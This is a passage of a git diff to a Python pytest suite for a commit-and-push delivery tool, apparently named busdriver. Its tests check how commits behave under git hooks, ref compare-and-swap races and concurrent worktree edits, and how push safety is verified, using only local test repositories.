     assert run(["git", "log", "-1", "--format=%s"], repo).stdout.strip() == "init"
 
 
-def test_commit_staged_index_cleans_untracked_reviewed_deletion_after_post_commit_hook(tmp_path: Path):
+def test_commit_staged_index_preserves_concurrent_reviewed_path_after_cas_rollback(monkeypatch, tmp_path: Path):
+    ns = runpy.run_path(str(DELIVER))
+    repo = init_repo(tmp_path / "repo-cas-rollback-preserve")
+    assert run(["git", "config", "user.email", "test@example.com"], repo).returncode == 0
+    assert run(["git", "config", "user.name", "Test User"], repo).returncode == 0
+    (repo / "tracked.txt").write_text("before\n")
+    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
+    assert run(["git", "-c", "commit.gpgsign=false", "commit", "-m", "init"], repo).returncode == 0
+    before = run(["git", "rev-parse", "HEAD"], repo).stdout.strip()
+    (repo / "tracked.txt").write_text("reviewed\n")
+    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
+
+    globals_ = ns["commit_staged_index"].__globals__
+    real_run_safe = globals_["run_safe"]
+    real_git_output = globals_["git_output"]
+    update_ref_calls = {"count": 0}
+
+    def fake_run_safe(cmd, *args, **kwargs):
+        if cmd[:2] == ["git", "update-ref"]:
+            update_ref_calls["count"] += 1
+            if update_ref_calls["count"] == 2:
+                (repo / "tracked.txt").write_text("concurrent-after-publish\n")
+        return real_run_safe(cmd, *args, **kwargs)
+
+    def fake_git_output(repo_arg, *args):
+        if args[:3] == ("log", "-1", "--format=%B"):
+            return 0, "wrong-message\n", ""
+        return real_git_output(repo_arg, *args)
+
+    monkeypatch.setitem(globals_, "run_safe", fake_run_safe)
+    monkeypatch.setitem(globals_, "git_output", fake_git_output)
+
+    effect = ns["commit_staged_index"](
+        repo, "reviewed message", {"BUSDRIVER_STATE_DIR": ".claude"}, disable_hooks=True,
+    )
+
+    assert effect["ok"] is False
+    assert effect["error"] == "committed_message_mismatch_after_hooks"
+    assert effect["reconciliation_required"] is True
+    assert effect["worktree_index_preserved"] is True
+    assert run(["git", "rev-parse", "HEAD"], repo).stdout.strip() == before
+    assert (repo / "tracked.txt").read_text() == "concurrent-after-publish\n"
+    assert not any(
+        step["name"].startswith(("git_restore", "git_clean", "git_remove"))
+        for step in effect["substeps"]
+    )
+
+
+def test_commit_staged_index_preserves_concurrent_untracked_recreation_after_publish(tmp_path: Path):
     ns = runpy.run_path(str(DELIVER))
     repo = init_repo(tmp_path / "repo-post-commit-delete-untracked")
     assert run(["git", "config", "user.email", "test@example.com"], repo).returncode == 0
@@ -1978,11 +3108,11 @@ def test_commit_staged_index_cleans_untracked_reviewed_deletion_after_post_commi
     effect = ns["commit_staged_index"](repo, "delete file", {"BUSDRIVER_STATE_DIR": ".claude"})
 
     assert effect["ok"] is True
-    assert not (repo / "tracked.txt").exists()
-    assert any(substep["name"] == "git_clean_reviewed_untracked_post_commit_drift" for substep in effect["substeps"])
+    assert (repo / "tracked.txt").read_text() == "post-commit-recreated-untracked\n"
+    assert effect["warning"] == "post_commit_concurrent_work_preserved"
 
 
-def test_commit_staged_index_restores_reviewed_deletion_after_post_commit_index_drift_without_pathspec_abort(monkeypatch, tmp_path: Path):
+def test_commit_staged_index_preserves_concurrent_staged_recreation_after_publish(monkeypatch, tmp_path: Path):
     ns = runpy.run_path(str(DELIVER))
     repo = init_repo(tmp_path / "repo-post-commit-delete-index-drift")
     assert run(["git", "config", "user.email", "test@example.com"], repo).returncode == 0
@@ -2007,13 +3137,11 @@ def test_commit_staged_index_restores_reviewed_deletion_after_post_commit_index_
     effect = ns["commit_staged_index"](repo, "delete file", {"BUSDRIVER_STATE_DIR": ".claude"})
 
     assert effect["ok"] is True
-    assert not (repo / "tracked.txt").exists()
-    assert run(["git", "diff", "--quiet"], repo).returncode == 0
-    assert run(["git", "diff", "--cached", "--quiet"], repo).returncode == 0
-    assert any(substep["name"] == "git_restore_reviewed_paths_after_post_commit_drift" for substep in effect["substeps"])
+    assert (repo / "tracked.txt").read_text() == "post-commit-recreated-and-staged\n"
+    assert effect["warning"] == "post_commit_concurrent_work_preserved"
 
 
-def test_commit_staged_index_cleans_tracked_post_commit_hook_drift(tmp_path: Path):
+def test_commit_staged_index_preserves_tracked_concurrent_post_publish_drift(tmp_path: Path):
     ns = runpy.run_path(str(DELIVER))
     repo = init_repo(tmp_path / "repo-post-commit-drift")
     assert run(["git", "config", "user.email", "test@example.com"], repo).returncode == 0
@@ -2030,10 +3158,8 @@ def test_commit_staged_index_cleans_tracked_post_commit_hook_drift(tmp_path: Pat
     effect = ns["commit_staged_index"](repo, "post commit drift", {"BUSDRIVER_STATE_DIR": ".claude"})
 
     assert effect["ok"] is True
-    assert (repo / "tracked.txt").read_text() == "reviewed\n"
-    assert run(["git", "diff", "--quiet"], repo).returncode == 0
-    assert run(["git", "diff", "--cached", "--quiet"], repo).returncode == 0
-    assert any(substep["name"] == "git_restore_reviewed_paths_after_post_commit_drift" for substep in effect["substeps"])
+    assert (repo / "tracked.txt").read_text() == "post-commit-drift\n"
+    assert effect["warning"] == "post_commit_concurrent_work_preserved"
 
 
 def test_commit_staged_index_detects_hook_created_invalid_marker(tmp_path: Path):
@@ -2056,7 +3182,7 @@ def test_commit_staged_index_detects_hook_created_invalid_marker(tmp_path: Path)
     effect = ns["commit_staged_index"](repo, "invalid marker", {"BUSDRIVER_STATE_DIR": ".claude"})
 
     assert effect["ok"] is True
-    assert effect["warning"] == "post_commit_untracked_dirty"
+    assert effect["warning"] == "post_commit_concurrent_work_preserved"
     assert (repo / ".claude" / "litmus-passed.local").is_symlink()
 
 
@@ -2090,7 +3216,7 @@ def test_commit_staged_index_fails_closed_when_post_commit_status_unavailable(mo
     assert run(["git", "rev-parse", "HEAD"], repo).stdout.strip() != before
 
 
-def test_commit_staged_index_fails_without_overwriting_external_post_commit_drift(tmp_path: Path):
+def test_commit_staged_index_completes_with_warning_without_overwriting_external_post_commit_drift(tmp_path: Path):
     ns = runpy.run_path(str(DELIVER))
     repo = init_repo(tmp_path / "repo-post-commit-external-drift")
     assert run(["git", "config", "user.email", "test@example.com"], repo).returncode == 0
@@ -2108,9 +3234,9 @@ def test_commit_staged_index_fails_without_overwriting_external_post_commit_drif
     effect = ns["commit_staged_index"](repo, "external post commit drift", {"BUSDRIVER_STATE_DIR": ".claude"})
 
     assert effect["ok"] is True
-    assert effect["warning"] == "post_commit_external_dirty_drift"
+    assert effect["warning"] == "post_commit_concurrent_work_preserved"
     assert (repo / "external.txt").read_text() == "external-drift\n"
-    assert any(substep["name"] == "git_non_marker_tracked_post_commit_drift_left_for_operator" for substep in effect["substeps"])
+    assert any(substep["name"] == "git_post_commit_concurrent_work_left_for_operator" for substep in effect["substeps"])
 
 
 def test_commit_staged_index_preserves_absolute_marker_state_dir_dirty(tmp_path: Path):
@@ -2134,7 +3260,8 @@ def test_commit_staged_index_preserves_absolute_marker_state_dir_dirty(tmp_path:
     effect = ns["commit_staged_index"](repo, "preserve abs marker", {"BUSDRIVER_STATE_DIR": str(state_dir)})
 
     assert effect["ok"] is False
-    assert (repo / "tracked.txt").read_text() == "reviewed\n"
+    assert effect["reconciliation_required"] is True
+    assert (repo / "tracked.txt").read_text() == "hook-mutated\n"
     assert (state_dir / "litmus-passed.local").read_text() == "allowed-absolute-marker-dirty\n"
 
 
@@ -2159,8 +3286,9 @@ def test_commit_staged_index_detects_hook_rewritten_preexisting_marker_dirty(tmp
 
     assert effect["ok"] is False
     assert effect["restore_reviewed_worktree_ok"] is False
+    assert effect["reconciliation_required"] is True
     assert (repo / ".claude" / "litmus-passed.local").read_text() == "hook-rewrote-marker\n"
-    assert any(substep["name"] == "git_non_marker_tracked_failed_commit_drift_left_for_operator" for substep in effect["substeps"])
+    assert any(substep["name"] == "git_status_after_failed_commit_rollback_preserve" for substep in effect["substeps"])
 
 
 def test_commit_staged_index_detects_deleted_preexisting_untracked_marker(tmp_path: Path):
@@ -2183,8 +3311,9 @@ def test_commit_staged_index_detects_deleted_preexisting_untracked_marker(tmp_pa
 
     assert effect["ok"] is False
     assert effect["restore_reviewed_worktree_ok"] is False
+    assert effect["reconciliation_required"] is True
     assert not (repo / ".claude" / "litmus-passed.local").exists()
-    assert any(substep["name"] == "git_non_marker_tracked_failed_commit_drift_left_for_operator" for substep in effect["substeps"])
+    assert any(substep["name"] == "git_status_after_failed_commit_rollback_preserve" for substep in effect["substeps"])
 
 
 def test_commit_staged_index_preserves_preexisting_marker_dirty_on_hook_failure(tmp_path: Path):
@@ -2210,7 +3339,8 @@ def test_commit_staged_index_preserves_preexisting_marker_dirty_on_hook_failure(
     effect = ns["commit_staged_index"](repo, "preserve marker", {"BUSDRIVER_STATE_DIR": ".claude"})
 
     assert effect["ok"] is False
-    assert (repo / "tracked.txt").read_text() == "reviewed\n"
+    assert effect["reconciliation_required"] is True
+    assert (repo / "tracked.txt").read_text() == "hook-mutated\n"
     assert (repo / ".claude" / "litmus-passed.local").read_text() == "allowed-marker-dirty\n"
     assert (repo / ".opencode" / "pr-review-passed.local").read_text() == "allowed-opencode-marker-dirty\n"
 
@@ -2220,6 +3350,7 @@ def test_push_success_requires_remote_head_to_match_local_head(monkeypatch, tmp_
     repo = init_repo(tmp_path / "repo-push-mismatch")
     plugin = fake_busdriver(tmp_path / "busdriver-push-mismatch")
     globals_ = ns["execute_mutating_operation"].__globals__
+    mock_isolated_push(monkeypatch, globals_, True)
     delivery_status = delivery_status_for_mutation(repo, "pr_review_fresh", "pr_review_fresh")
     live_head_calls = {"count": 0}
 
@@ -2236,7 +3367,8 @@ def test_push_success_requires_remote_head_to_match_local_head(monkeypatch, tmp_
     monkeypatch.setitem(globals_, "current_branch", lambda _repo: "feature")
     monkeypatch.setitem(globals_, "valid_local_branch_name", lambda _repo, _branch: True)
     monkeypatch.setitem(globals_, "push_remote_safety", lambda _repo, _remote: (True, None))
-    monkeypatch.setitem(globals_, "pr_review_base_matches", lambda *_args: True)
+    monkeypatch.setitem(globals_, "github_remote_url", lambda _repo, _remote: "https://github.com/owner/repo.git")
+    monkeypatch.setitem(globals_, "pr_review_base_matches", lambda *_args, **_kwargs: True)
     monkeypatch.setitem(globals_, "remote_head_ancestor_status", lambda *_args: (True, None))
     monkeypatch.setitem(globals_, "live_remote_branch_head", fake_live_remote_branch_head)
     def fake_git_output(_repo, *args):
@@ -2276,6 +3408,54 @@ def test_push_success_requires_remote_head_to_match_local_head(monkeypatch, tmp_
     assert any(effect["name"] == "git_push_remote_post_verify" and effect["ok"] is False for effect in result["mutating_run"]["side_effects"])
 
 
+def test_push_blocks_local_head_change_after_review_before_side_effect(monkeypatch, tmp_path: Path):
+    ns = runpy.run_path(str(DELIVER))
+    repo = init_repo(tmp_path / "repo-push-head-drift")
+    plugin = fake_busdriver(tmp_path / "busdriver-push-head-drift")
+    globals_ = ns["execute_mutating_operation"].__globals__
+    delivery_status = delivery_status_for_mutation(repo, "pr_review_fresh", "pr_review_fresh")
+    head_calls = {"count": 0}
+    push_called = {"value": False}
+
+    def fake_git_output(_repo, *args):
+        if args[:2] == ("rev-parse", "HEAD"):
+            head_calls["count"] += 1
+            return 0, "reviewed-head" if head_calls["count"] == 1 else "changed-head", ""
+        if args[:1] == ("status",):
+            return 0, "", ""
+        return 0, "origin/main", ""
+
+    def fake_run_safe(*_args, **_kwargs):
+        push_called["value"] = True
+        return {"ok": True, "returncode": 0}
+
+    monkeypatch.setitem(globals_, "acquire_finalization_lock", lambda _repo, _state_dir=None: {"acquired": True, "token": "lock-token"})
+    monkeypatch.setitem(globals_, "release_finalization_lock", lambda _repo, _token, _state_dir=None: {"released": True})
+    monkeypatch.setitem(globals_, "run_delivery_status", lambda _args, include_lock_status=False: (delivery_status, 0))
+    monkeypatch.setitem(globals_, "commit_blocking_dirty_entries", lambda _status, _args: [])
+    monkeypatch.setitem(globals_, "current_branch", lambda _repo: "feature")
+    monkeypatch.setitem(globals_, "valid_local_branch_name", lambda _repo, _branch: True)
+    monkeypatch.setitem(globals_, "push_remote_safety", lambda _repo, _remote: (True, None))
+    monkeypatch.setitem(globals_, "github_remote_url", lambda _repo, _remote: "https://github.com/owner/repo.git")
+    monkeypatch.setitem(globals_, "pr_review_base_matches", lambda *_args, **_kwargs: True)
+    monkeypatch.setitem(globals_, "live_remote_branch_head", lambda *_args: (None, "remote_branch_not_found"))
+    monkeypatch.setitem(globals_, "remote_head_ancestor_status", lambda *_args: (True, None))
+    monkeypatch.setitem(globals_, "git_output", fake_git_output)
+    monkeypatch.setitem(globals_, "run_safe", fake_run_safe)
+    args = argparse.Namespace(
+        operation="push", mode="execute", repo=str(repo), plugin_root=str(plugin), state_dir=None, run_id="run-push-head-drift",
+        pr=None, commit_message="title", pr_title="title", pr_body="body", push_remote="origin", push_branch=None, head=None,
+        base="main", merge_method="squash", delete_branch=True, busdriver_state_dir_name=None, verifier_timeout=180,
+    )
+
+    result, rc = ns["execute_mutating_operation"](args, delivery_status)
+
+    assert rc == 1
+    assert result["ok"] is False
+    assert result["decision"]["reason"] == "local_head_changed_after_review"
+    assert push_called["value"] is False
+
+
 def test_commit_staged_index_uses_git_commit_hooks(tmp_path: Path):
     ns = runpy.run_path(str(DELIVER))
     repo = init_repo(tmp_path / "repo")
@@ -2299,6 +3479,103 @@ def test_commit_staged_index_uses_git_commit_hooks(tmp_path: Path):
     assert "--cleanup=verbatim" in effect["cmd"]
     assert "--no-verify" not in effect["cmd"]
     assert all("commit-tree" not in substep["cmd"] and "update-ref" not in substep["cmd"] for substep in effect["substeps"])
+
+
+def test_commit_staged_index_can_disable_untrusted_hooks_for_finalization(tmp_path: Path):
+    ns = runpy.run_path(str(DELIVER))
+    repo = init_repo(tmp_path / "repo-disabled-hooks")
+    assert run(["git", "config", "user.email", "test@example.com"], repo).returncode == 0
+    assert run(["git", "config", "user.name", "Test User"], repo).returncode == 0
+    (repo / "tracked.txt").write_text("one\n")
+    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
+    assert run(["git", "-c", "commit.gpgsign=false", "commit", "-m", "init"], repo).returncode == 0
+    marker = tmp_path / "hook-must-not-run"
+    hook = repo / ".git" / "hooks" / "pre-commit"
+    hook.write_text(f"#!/bin/sh\nprintf ran > {shlex.quote(str(marker))}\n")
+    hook.chmod(0o755)
+    (repo / "tracked.txt").write_text("two\n")
+    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
+
+    effect = ns["commit_staged_index"](repo, "safe commit", disable_hooks=True)
+
+    assert effect["ok"] is True
+    assert marker.exists() is False
+    assert effect["cmd"][:2] == ["git", "update-ref"]
+    assert any(substep["name"] == "git_commit_tree" for substep in effect["substeps"])
+    assert any(substep["name"] == "git_update_ref_commit_cas" for substep in effect["substeps"])
+
+
+def test_commit_staged_index_cas_never_removes_concurrent_commit(monkeypatch, tmp_path: Path):
+    ns = runpy.run_path(str(DELIVER))
+    repo = init_repo(tmp_path / "repo-commit-cas-race")
+    assert run(["git", "config", "user.email", "test@example.com"], repo).returncode == 0
+    assert run(["git", "config", "user.name", "Test User"], repo).returncode == 0
+    (repo / "tracked.txt").write_text("one\n")
+    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
+    assert run(["git", "-c", "commit.gpgsign=false", "commit", "-m", "init"], repo).returncode == 0
+    original = run(["git", "rev-parse", "HEAD"], repo).stdout.strip()
+    branch_ref = run(["git", "symbolic-ref", "HEAD"], repo).stdout.strip()
+    (repo / "tracked.txt").write_text("reviewed\n")
+    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
+    commit_staged_index = ns["commit_staged_index"]
+    globals_ = commit_staged_index.__globals__
+    real_run_safe = globals_["run_safe"]
+    concurrent: dict[str, str | None] = {"oid": None}
+
+    def racing_run_safe(argv, *args, **kwargs):
+        if argv[:2] == ["git", "update-ref"] and concurrent["oid"] is None:
+            parent_tree = run(["git", "rev-parse", f"{original}^{{tree}}"], repo).stdout.strip()
+            oid = run(["git", "commit-tree", parent_tree, "-p", original, "-m", "concurrent"], repo).stdout.strip()
+            assert run(["git", "update-ref", branch_ref, oid, original], repo).returncode == 0
+            concurrent["oid"] = oid
+        return real_run_safe(argv, *args, **kwargs)
+
+    monkeypatch.setitem(globals_, "run_safe", racing_run_safe)
+    effect = commit_staged_index(repo, "reviewed commit", disable_hooks=True)
+
+    assert effect["ok"] is False
+    assert effect["error"] == "commit_parent_changed_during_publish"
+    assert concurrent["oid"]
+    assert run(["git", "rev-parse", "HEAD"], repo).stdout.strip() == concurrent["oid"]
+
+
+def test_commit_staged_index_preserves_ref_advanced_after_successful_cas(monkeypatch, tmp_path: Path):
+    ns = runpy.run_path(str(DELIVER))
+    repo = init_repo(tmp_path / "repo-commit-post-cas-race")
+    assert run(["git", "config", "user.email", "test@example.com"], repo).returncode == 0
+    assert run(["git", "config", "user.name", "Test User"], repo).returncode == 0
+    (repo / "tracked.txt").write_text("one\n")
+    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
+    assert run(["git", "-c", "commit.gpgsign=false", "commit", "-m", "init"], repo).returncode == 0
+    branch_ref = run(["git", "symbolic-ref", "HEAD"], repo).stdout.strip()
+    (repo / "tracked.txt").write_text("reviewed\n")
+    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
+    commit_staged_index = ns["commit_staged_index"]
+    globals_ = commit_staged_index.__globals__
+    real_run_safe = globals_["run_safe"]
+    concurrent: dict[str, str | None] = {"oid": None}
+
+    def racing_run_safe(argv, *args, **kwargs):
+        effect = real_run_safe(argv, *args, **kwargs)
+        if argv[:3] == ["git", "update-ref", branch_ref] and concurrent["oid"] is None and effect["ok"]:
+            candidate = argv[3]
+            tree = run(["git", "rev-parse", f"{candidate}^{{tree}}"], repo).stdout.strip()
+            oid = run(["git", "commit-tree", tree, "-p", candidate, "-m", "concurrent"], repo).stdout.strip()
+            assert run(["git", "update-ref", branch_ref, oid, candidate], repo).returncode == 0
+            concurrent["oid"] = oid
+        return effect
+
+    monkeypatch.setitem(globals_, "run_safe", racing_run_safe)
+    effect = commit_staged_index(repo, "reviewed commit", disable_hooks=True)
+
+    assert effect["ok"] is False
+    assert effect["error"] == "post_publish_ref_advanced"
+    assert concurrent["oid"]
+    assert effect["candidate_commit"] != concurrent["oid"]
+    assert run(["git", "rev-parse", "HEAD"], repo).stdout.strip() == concurrent["oid"]
+    rollback = next(step for step in effect["substeps"] if step["name"] == "git_update_ref_before_after_hook_drift")
+    assert rollback["cmd"] == ["git", "update-ref", branch_ref, effect["before_head"], effect["candidate_commit"]]
+    assert rollback["ok"] is False
 
 
 def test_commit_staged_index_rejects_commit_msg_hook_message_rewrite(tmp_path: Path):
@@ -2345,13 +3622,15 @@ def test_commit_staged_index_rejects_hook_modified_index(tmp_path: Path):
     assert effect["ok"] is False
     assert effect["error"] == "committed_tree_or_parent_mismatch_after_hooks"
     assert effect["reset_to_before_ok"] is True
-    assert effect["restore_reviewed_index_ok"] is True
-    assert effect["restore_reviewed_worktree_ok"] is True
+    assert effect["restore_reviewed_index_ok"] is False
+    assert effect["restore_reviewed_worktree_ok"] is False
+    assert effect["reconciliation_required"] is True
+    assert effect["worktree_index_preserved"] is True
     assert run(["git", "rev-parse", "HEAD"], repo).stdout.strip() == before
-    assert run(["git", "write-tree"], repo).stdout.strip() == effect["expected_tree"]
-    assert (repo / "tracked.txt").read_text() == "reviewed\n"
+    assert run(["git", "write-tree"], repo).stdout.strip() != effect["expected_tree"]
+    assert (repo / "tracked.txt").read_text() == "hook-mutated\n"
     assert any(substep["name"] == "git_update_ref_before_after_hook_drift" for substep in effect["substeps"])
-    assert any(substep["name"] == "git_restore_reviewed_tree" for substep in effect["substeps"])
+    assert not any(substep["name"].startswith("git_restore") for substep in effect["substeps"])
 
 
 @pytest.mark.parametrize(
@@ -2485,31 +3764,6 @@ def test_push_remote_safety_rejects_local_push_modifiers(tmp_path: Path):
         assert ns["push_remote_safety"](repo, "origin") == (False, reason)
 
 
-def test_pr_create_checks_push_remote_safety_before_remote_head_lookup(monkeypatch, tmp_path: Path):
-    ns = runpy.run_path(str(DELIVER))
-    repo = init_repo(tmp_path / "repo")
-    globals_ = ns["execute_mutating_operation"].__globals__
-    calls = {"remote_head": 0}
-    decision = {"status": "pr_review_fresh", "blockers": [], **{key: False for key in BLOCKED_KEYS}}
-    delivery_status = {
-        "schema": "hermes-busdriver-delivery-status/v0", "read_only": True, "ok": True,
-        "repo": {"root": str(repo)}, "markers": {"blocking": []}, "decision": decision,
-        "litmus_status": {"available": True, "ok": True, "summary": {"schema": "hermes-busdriver-litmus-status/v0", "read_only": True, "ok": True, "authority_safe": True, "decision_status_recognized": True, "decision": {"status": "pr_review_fresh", **{key: False for key in BLOCKED_KEYS}}}},
-    }
-    monkeypatch.setitem(globals_, "acquire_finalization_lock", lambda _repo, _state_dir=None: {"acquired": True, "token": "t"})
-    monkeypatch.setitem(globals_, "release_finalization_lock", lambda _repo, _token, _state_dir=None: {"released": True})
-    monkeypatch.setitem(globals_, "run_delivery_status", lambda _args, include_lock_status=False: (delivery_status, 0))
-    monkeypatch.setitem(globals_, "current_branch", lambda _repo: "feature")
-    monkeypatch.setitem(globals_, "normalized_pr_head_arg", lambda _repo, _head, _branch, _remote: (None, None))
-    monkeypatch.setitem(globals_, "push_remote_safety", lambda _repo, _remote: (False, "url_rewrite_blocked_for_push"))
-    monkeypatch.setitem(globals_, "live_remote_branch_head", lambda *_args: calls.__setitem__("remote_head", calls["remote_head"] + 1) or ("abc", None))
-    args = argparse.Namespace(operation="pr-create", mode="execute", repo=str(repo), plugin_root=str(fake_busdriver(tmp_path / "busdriver")), state_dir=None, run_id=None, pr=None, commit_message="title", pr_title=None, pr_body="body", push_remote="origin", push_branch=None, head=None, base=None, busdriver_state_dir_name=None)
-
-    result, rc = ns["execute_mutating_operation"](args, delivery_status)
-
-    assert rc == 2
-    assert result["decision"]["reason"] == "url_rewrite_blocked_for_push"
-    assert calls["remote_head"] == 0
 
 
 def test_execute_commit_requires_message_and_writes_blocked_artifact(tmp_path: Path):
@@ -2545,11 +3799,76 @@ def test_execute_commit_requires_message_and_writes_blocked_artifact(tmp_path: P
     assert Path(data["run_artifact_path"]).exists()
 
 
+def test_isolated_push_is_non_dispatchable_without_atomic_reviewed_base_binding(tmp_path: Path):
+    ns = runpy.run_path(str(DELIVER))
+    repo = init_repo(tmp_path / "repo-atomic-base-race")
+    assert run(["git", "config", "user.email", "test@example.com"], repo).returncode == 0
+    assert run(["git", "config", "user.name", "Test User"], repo).returncode == 0
+    (repo / "tracked.txt").write_text("base\n")
+    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
+    assert run(["git", "-c", "commit.gpgsign=false", "commit", "-m", "base"], repo).returncode == 0
+    assert run(["git", "branch", "-M", "main"], repo).returncode == 0
+    base_oid = run(["git", "rev-parse", "HEAD"], repo).stdout.strip()
+    remote = tmp_path / "remote.git"
+    assert run(["git", "clone", "--bare", "--no-local", str(repo), str(remote)]).returncode == 0
+    assert run(["git", "checkout", "-b", "feature"], repo).returncode == 0
+    (repo / "tracked.txt").write_text("feature\n")
+    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
+    assert run(["git", "-c", "commit.gpgsign=false", "commit", "-m", "feature"], repo).returncode == 0
+    feature_oid = run(["git", "rev-parse", "HEAD"], repo).stdout.strip()
+    base_tree = run(["git", "--git-dir", str(remote), "rev-parse", f"{base_oid}^{{tree}}"]).stdout.strip()
+    advance = run(["git", "--git-dir", str(remote), "-c", "user.name=Concurrent", "-c", "user.email=concurrent@example.com", "commit-tree", base_tree, "-p", base_oid, "-m", "advance base"])
+    assert advance.returncode == 0, advance.stderr
+    advance_oid = advance.stdout.strip()
+    hook = remote / "hooks" / "pre-receive"
+    received = tmp_path / "receive-commands"
+    hook.write_text(
+        "#!/bin/sh\n"
+        f"while IFS=' ' read old new ref; do printf '%s %s %s\\n' \"$old\" \"$new\" \"$ref\" >> {shlex.quote(str(received))}; done\n"
+        "unset GIT_QUARANTINE_PATH GIT_OBJECT_DIRECTORY GIT_ALTERNATE_OBJECT_DIRECTORIES\n"
+        f"git update-ref refs/heads/main {advance_oid} {base_oid}\n"
+    )
+    hook.chmod(0o755)
+    assert run(["git", "--git-dir", str(remote), "config", "core.hooksPath", str(remote / "hooks")]).returncode == 0
+
+    effect = ns["run_isolated_push"](repo, str(remote), "feature", None, feature_oid, "main", base_oid)
+
+    assert effect["ok"] is False
+    assert effect["error"] == "atomic_push_base_binding_unavailable"
+    assert run(["git", "--git-dir", str(remote), "rev-parse", "refs/heads/main"]).stdout.strip() == base_oid
+    assert run(["git", "--git-dir", str(remote), "show-ref", "--verify", "refs/heads/feature"]).returncode != 0
+
+    # Characterize the transport gap that keeps production dispatch disabled:
+    # Git reports the unchanged base refspec as up to date and sends only the
+    # feature update, so the hook can advance base without aborting the feature.
+    actual = run(
+        [
+            "git",
+            "push",
+            "--porcelain",
+            "--atomic",
+            f"--force-with-lease=refs/heads/main:{base_oid}",
+            f"--force-with-lease=refs/heads/feature:{'0' * 40}",
+            str(remote),
+            f"{feature_oid}:refs/heads/feature",
+            f"{base_oid}:refs/heads/main",
+        ],
+        repo,
+    )
+    assert actual.returncode == 0, actual.stderr
+    commands = received.read_text().splitlines()
+    assert len(commands) == 1
+    assert commands[0].endswith(f" {feature_oid} refs/heads/feature")
+    assert run(["git", "--git-dir", str(remote), "rev-parse", "refs/heads/main"]).stdout.strip() == advance_oid
+    assert run(["git", "--git-dir", str(remote), "rev-parse", "refs/heads/feature"]).stdout.strip() == feature_oid
+
+
 def test_failed_push_existing_remote_unchanged_remains_git_push_failed(monkeypatch, tmp_path: Path):
     ns = runpy.run_path(str(DELIVER))
     repo = init_repo(tmp_path / "repo-failed-push-remote-unchanged")
     plugin = fake_busdriver(tmp_path / "busdriver-failed-push-remote-unchanged")
     globals_ = ns["execute_mutating_operation"].__globals__
+    mock_isolated_push(monkeypatch, globals_, False)
     delivery_status = delivery_status_for_mutation(repo, "pr_review_fresh", "pr_review_fresh")
 
     def fake_git_output(_repo, *args):
@@ -2566,7 +3885,8 @@ def test_failed_push_existing_remote_unchanged_remains_git_push_failed(monkeypat
     monkeypatch.setitem(globals_, "current_branch", lambda _repo: "feature")
     monkeypatch.setitem(globals_, "valid_local_branch_name", lambda _repo, _branch: True)
     monkeypatch.setitem(globals_, "push_remote_safety", lambda _repo, _remote: (True, None))
-    monkeypatch.setitem(globals_, "pr_review_base_matches", lambda *_args: True)
+    monkeypatch.setitem(globals_, "github_remote_url", lambda _repo, _remote: "https://github.com/owner/repo.git")
+    monkeypatch.setitem(globals_, "pr_review_base_matches", lambda *_args, **_kwargs: True)
     monkeypatch.setitem(globals_, "remote_head_ancestor_status", lambda *_args: (True, None))
     monkeypatch.setitem(globals_, "live_remote_branch_head", lambda _repo, _branch, _remote: ("old-remote-head", None))
     monkeypatch.setitem(globals_, "git_output", fake_git_output)
@@ -2584,11 +3904,63 @@ def test_failed_push_existing_remote_unchanged_remains_git_push_failed(monkeypat
     assert result["decision"]["reason"] == "git_push_failed"
 
 
-def test_failed_push_rechecks_existing_remote_and_accepts_verified_update(monkeypatch, tmp_path: Path):
+@pytest.mark.parametrize("release_succeeds", [True, False])
+def test_push_exact_remote_target_is_noop_with_no_authority_and_release_is_enforced(monkeypatch, tmp_path: Path, release_succeeds: bool):
+    ns = runpy.run_path(str(DELIVER))
+    repo = init_repo(tmp_path / f"repo-push-noop-{release_succeeds}")
+    plugin = fake_busdriver(tmp_path / f"busdriver-push-noop-{release_succeeds}")
+    globals_ = ns["execute_mutating_operation"].__globals__
+    delivery_status = delivery_status_for_mutation(repo, "pr_review_fresh", "pr_review_fresh")
+
+    def fake_git_output(_repo, *args):
+        if args[:2] == ("rev-parse", "HEAD"):
+            return 0, "reviewed-local-head", ""
+        return 0, "", ""
+
+    monkeypatch.setitem(globals_, "acquire_finalization_lock", lambda _repo, _state_dir=None: {"acquired": True, "token": "lock-token"})
+    monkeypatch.setitem(globals_, "release_finalization_lock", lambda _repo, _token, _state_dir=None: {"released": release_succeeds, "reason": None if release_succeeds else "release_failed"})
+    monkeypatch.setitem(globals_, "run_delivery_status", lambda _args, include_lock_status=False: (delivery_status, 0))
+    monkeypatch.setitem(globals_, "commit_blocking_dirty_entries", lambda _status, _args: [])
+    monkeypatch.setitem(globals_, "current_branch", lambda _repo: "feature")
+    monkeypatch.setitem(globals_, "valid_local_branch_name", lambda _repo, _branch: True)
+    monkeypatch.setitem(globals_, "push_remote_safety", lambda _repo, _remote: (True, None))
+    monkeypatch.setitem(globals_, "github_remote_url", lambda _repo, _remote: "https://github.com/owner/repo.git")
+    monkeypatch.setitem(globals_, "pr_review_base_matches", lambda *_args, **_kwargs: True)
+    monkeypatch.setitem(globals_, "live_remote_branch_head", lambda _repo, _branch, _remote: ("reviewed-local-head", None))
+    monkeypatch.setitem(globals_, "git_output", fake_git_output)
+    args = argparse.Namespace(
+        operation="push", mode="execute", repo=str(repo), plugin_root=str(plugin), state_dir=None, run_id=f"run-push-noop-{release_succeeds}",
+        pr=None, commit_message="title", pr_title="title", pr_body="body", push_remote="origin", push_branch=None, head=None,
+        base="main", merge_method="squash", delete_branch=True, busdriver_state_dir_name=None, verifier_timeout=180,
+    )
+
+    result, rc = ns["execute_mutating_operation"](args, delivery_status)
+    release = getattr(ns["execute_mutating_operation"], "last_release")
+    reconciliation = ns["release_failure_reconciliation"]("push", result["mutating_run"], release)
+    if reconciliation:
+        result["decision"], result["steps"], rc = reconciliation
+        result["ok"] = False
+
+    assert result["mutating_run"]["lock_release"]["released"] is release_succeeds
+    assert_run_authority_blocked(result["mutating_run"])
+    if release_succeeds:
+        assert rc == 0
+        assert result["ok"] is True
+        assert result["decision"]["status"] == result["mutating_run"]["status"] == "already_up_to_date"
